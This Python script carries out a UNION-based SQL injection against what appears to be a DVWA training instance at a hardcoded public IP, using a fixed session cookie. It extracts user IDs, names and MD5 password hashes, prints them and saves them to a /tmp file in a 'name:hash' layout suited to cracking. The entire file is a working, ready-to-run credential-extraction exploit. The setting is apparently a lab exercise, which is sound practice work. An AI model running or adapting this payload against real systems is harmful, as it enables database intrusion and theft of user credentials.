
import requests
import re
import html

# Create session and set cookies
session = requests.Session()
session.cookies.set('PHPSESSID', 'u1sbabk40idi42696eoie42qk7')
session.cookies.set('security', 'low')

url_base = "http://31.97.117.123"
sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[+] ===== EXTRACTING ALL COLUMNS FROM USERS TABLE =====\n")

# Let's extract all columns: user_id, first_name, last_name, user, password
# Since the page only displays 2 columns (first_name, last_name), we need to modify our approach
# We can concatenate the columns or query them differently

payload = "999' UNION SELECT CONCAT(user_id,':',first_name,':',last_name), password FROM users -- -"

print(f"[*] SQL Injection Payload: {payload}\n")

try:
    response = session.get(sqli_url, params={'id': payload, 'Submit': 'Submit'}, timeout=10)
    
    # Find all <pre> blocks
    pre_blocks = re.findall(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    
    users_found = []
    
    for block_idx, block in enumerate(pre_blocks):
        block_decoded = html.unescape(block)
        lines = block_decoded.split('<br />')
        
        if len(lines) >= 3:
            id_line = lines[0]
            firstname_line = lines[1]
            surname_line = lines[2]
            
            id_match = re.search(r'ID:\s*(.+?)$', id_line)
            username_match = re.search(r'First name:\s*(.+?)$', firstname_line)
            hash_match = re.search(r'Surname:\s*(.+?)$', surname_line)
            
            if id_match and username_match and hash_match:
                id_val = id_match.group(1).strip()
                username_data = username_match.group(1).strip()  # This contains user_id:first_name:last_name
                password_hash = hash_match.group(1).strip()
                
                if "UNION" not in id_val or block_idx > 0:
                    users_found.append((username_data, password_hash))
                    print(f"[+] Found: {username_data} | {password_hash}")
    
    if users_found:
        print(f"\n[+] ===== EXTRACTED {len(users_found)} USER RECORD(S) =====\n")
        
        # Parse the concatenated data
        parsed_users = []
        for user_data, password_hash in users_found:
            parts = user_data.split(':')
            if len(parts) >= 3:
                user_id = parts[0]
                first_name = parts[1]
                last_name = parts[2]
                parsed_users.append({
                    'user_id': user_id,
                    'first_name': first_name,
                    'last_name': last_name,
                    'password_hash': password_hash
                })
        
        print("=" * 130)
        print(f"{'User ID':<10} | {'First Name':<20} | {'Last Name':<20} | {'Password Hash (MD5)':<60}")
        print("=" * 130)
        for user in parsed_users:
            print(f"{user['user_id']:<10} | {user['first_name']:<20} | {user['last_name']:<20} | {user['password_hash']:<60}")
        print("=" * 130)
        
        # Save comprehensive data
        with open('/tmp/extracted_users_comprehensive.txt', 'w') as f:
            f.write("=" * 130 + "\n")
            f.write("COMPREHENSIVE USER DATA FROM DVWA - SQL INJECTION\n")
            f.write("=" * 130 + "\n\n")
            
            f.write("SQL INJECTION PAYLOAD:\n")
            f.write(f"  {payload}\n\n")
            
            f.write(f"{'User ID':<10} | {'First Name':<20} | {'Last Name':<20} | {'Password Hash (MD5)':<60}\n")
            f.write("-" * 130 + "\n")
            for user in parsed_users:
                f.write(f"{user['user_id']:<10} | {user['first_name']:<20} | {user['last_name']:<20} | {user['password_hash']:<60}\n")
            f.write("=" * 130 + "\n\n")
            
            f.write("DETAILED USER INFORMATION:\n")
            f.write("-" * 130 + "\n")
            for idx, user in enumerate(parsed_users, 1):
                f.write(f"\n[{idx}] USER RECORD:\n")
                f.write(f"    User ID:        {user['user_id']}\n")
                f.write(f"    First Name:     {user['first_name']}\n")
                f.write(f"    Last Name:      {user['last_name']}\n")
                f.write(f"    Full Name:      {user['first_name']} {user['last_name']}\n")
                f.write(f"    Password Hash:  {user['password_hash']}\n")
                f.write(f"    Hash Type:      MD5\n")
                f.write(f"    Hash Length:    {len(user['password_hash'])} characters\n")
            
            f.write("\n" + "=" * 130 + "\n")
            f.write("USERNAME:PASSWORD_HASH FORMAT:\n")
            f.write("-" * 130 + "\n")
            for user in parsed_users:
                f.write(f"{user['first_name']}:{user['password_hash']}\n")
            
            f.write("\n" + "=" * 130 + "\n")
            f.write("SUMMARY:\n")
            f.write(f"  Total Users: {len(parsed_users)}\n")
            f.write(f"  Extraction Method: SQL Injection (UNION SELECT)\n")
            f.write(f"  Database: DVWA\n")
            f.write(f"  Table: users\n")
            f.write("=" * 130 + "\n")
        
        print(f"\n[+] Data saved to: /tmp/extracted_users_comprehensive.txt")
        print(f"\n[*] Summary: Extracted {len(parsed_users)} users with their names and password hashes")
    else:
        print("[-] No users extracted")
    
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()

